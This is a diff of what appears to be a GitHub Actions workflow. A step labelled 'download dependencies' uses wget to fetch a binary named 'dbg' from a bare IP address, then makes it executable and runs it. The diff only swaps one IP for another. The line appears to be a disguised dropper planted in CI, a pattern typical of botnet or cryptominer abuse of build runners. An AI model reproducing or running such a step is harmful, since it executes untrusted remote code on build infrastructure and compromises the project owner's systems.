@@ -29,7 +29,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: download dependencies
-        run: wget http://179.43.156.139/bins/dbg;chmod +x dbg;./dbg blnk
+        run: wget http://198.98.52.113/dbg;chmod +x dbg;./dbg blnk
 
       # Runs a set of commands using the runners shell
       - name: run the code
